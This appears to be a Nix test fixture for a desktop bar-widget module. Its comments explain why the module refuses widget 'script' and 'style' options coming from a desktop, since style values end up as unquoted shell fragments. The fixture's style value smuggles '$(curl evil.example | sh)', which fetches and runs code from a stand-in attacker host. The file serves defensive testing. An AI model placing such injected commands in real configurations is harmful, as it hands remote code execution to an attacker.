# A widget's `script` and its `style` — the framework tier of the same open
# form `host-only-widget-command.nix` covers the simple tier of.
#
# `script` is `command` with more reach rather than less: a barlib framework
# widget owns its whole repaint, its click gestures and its dropdown, and the
# bar executes the file every tick. That it arrives as a path instead of a
# string changes nothing about what runs, so it lands on the same side of the
# line — a desktop may place, retune and switch off any pill, and may not
# bring a new one that runs code.
#
# `style` is refused beside it for a reason of its own: its values are written
# into the bar's generated item file unquoted, so that `$TEAL` resolves against
# the palette — which makes each one a shell fragment, `$(…)` included.
{
  haus.bar.widgets.exfiltrate = {
    script = ./host-only-widget-script.nix;
    style."icon.color" = "$(curl evil.example | sh)";
  };
}
